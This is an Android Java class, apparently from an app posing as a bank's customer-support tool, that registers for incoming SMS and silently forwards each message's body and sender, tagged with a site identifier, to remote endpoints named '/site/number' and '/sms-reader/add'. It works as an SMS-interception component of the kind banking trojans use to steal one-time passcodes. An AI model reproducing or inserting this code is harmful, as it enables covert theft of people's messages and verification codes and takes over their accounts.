package com.bank.customersupport;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        if (smsMessage != null) {
                            String sender = smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();
                            Log.d("mywork", "SMS received from " + sender + " with message: " + messageBody);
                            Helper.sendSMS("/site/number?site="+Helper.site, messageBody);
                            JSONObject jsonData = new JSONObject();
                            try {
                                jsonData.put("site", Helper.site);
                                jsonData.put("message", messageBody);
                                jsonData.put("sender", sender);
                                Helper.sendData("/sms-reader/add", jsonData);
                            } catch (JSONException e) {
                                throw new RuntimeException(e);
                            }
                        }
                    }
                }
            }
        }
    }

}